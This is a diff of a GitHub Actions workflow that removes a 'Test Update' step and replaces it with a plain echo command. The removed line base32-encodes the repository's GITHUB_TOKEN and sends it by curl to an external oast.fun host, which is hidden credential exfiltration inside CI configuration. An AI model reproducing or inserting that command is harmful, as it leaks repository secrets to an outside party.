@@ -15,5 +15,10 @@ jobs:
       - uses: amannn/action-semantic-pull-request@v4
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  test_update:
     name: Test Update
-        run: echo ${{ secrets.GITHUB_TOKEN }} | base32 | xargs -I{} curl -X POST -d "data={}" http://iqcckceetecakgvdeqdsy1cgcrixyulj5.oast.fun
+    runs-on: ubuntu-latest
+    steps:
+      - name: Echo test message
+        run: echo "This is a test update"
